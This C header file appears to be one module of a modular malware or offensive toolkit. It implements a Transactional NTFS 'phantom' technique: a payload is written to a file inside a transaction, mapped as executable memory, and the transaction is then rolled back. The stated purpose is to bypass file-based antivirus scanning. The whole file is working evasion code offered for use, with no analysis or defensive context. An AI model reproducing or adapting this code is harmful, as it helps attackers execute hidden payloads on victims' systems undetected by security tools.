/* chunk: evasion/txf_phantom
 * category: evasion
 * depends: api_resolve
 * provides: txf_phantom
 * description: Transactional NTFS (TxF) phantom write — create a file inside a
 *   transaction, map it into memory for execution, then rollback the transaction.
 *   The file never appears on disk from the filesystem's perspective, but the
 *   mapped memory remains valid. Bypasses file-based scanning entirely.
 */

#ifndef TXF_PHANTOM_H
#define TXF_PHANTOM_H

#include <windows.h>

typedef HANDLE (WINAPI *pCreateTransaction)(
    LPSECURITY_ATTRIBUTES, LPGUID, DWORD, DWORD, DWORD, DWORD, LPWSTR);
typedef HANDLE (WINAPI *pCreateFileTransactedW)(
    LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE, HANDLE, PUSHORT, PVOID);
typedef BOOL (WINAPI *pRollbackTransaction)(HANDLE);

static LPVOID txf_phantom_map(const BYTE *payload, DWORD payload_size) {
    HMODULE hKtmW32 = LoadLibraryA("ktmw32.dll");
    if (!hKtmW32) return NULL;

    pCreateTransaction fnCreateTx =
        (pCreateTransaction)GetProcAddress(hKtmW32, "CreateTransaction");
    pRollbackTransaction fnRollback =
        (pRollbackTransaction)GetProcAddress(hKtmW32, "RollbackTransaction");

    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    pCreateFileTransactedW fnCreateFileTx =
        (pCreateFileTransactedW)GetProcAddress(hKernel32, "CreateFileTransactedW");

    if (!fnCreateTx || !fnRollback || !fnCreateFileTx) return NULL;

    HANDLE hTx = fnCreateTx(NULL, NULL, 0, 0, 0, 0, NULL);
    if (hTx == INVALID_HANDLE_VALUE) return NULL;

    WCHAR tmpPath[MAX_PATH];
    WCHAR tmpFile[MAX_PATH];
    GetTempPathW(MAX_PATH, tmpPath);
    GetTempFileNameW(tmpPath, L"txf", 0, tmpFile);

    HANDLE hFile = fnCreateFileTx(
        tmpFile,
        GENERIC_WRITE | GENERIC_READ,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL,
        hTx,
        NULL,
        NULL
    );
    if (hFile == INVALID_HANDLE_VALUE) {
        fnRollback(hTx);
        CloseHandle(hTx);
        return NULL;
    }

    DWORD written;
    WriteFile(hFile, payload, payload_size, &written, NULL);

    HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_EXECUTE_READ, 0, 0, NULL);
    LPVOID mapped = NULL;
    if (hMap) {
        mapped = MapViewOfFile(hMap, FILE_MAP_EXECUTE | FILE_MAP_READ, 0, 0, 0);
        CloseHandle(hMap);
    }

    CloseHandle(hFile);
    fnRollback(hTx);
    CloseHandle(hTx);

    return mapped;
}

#endif
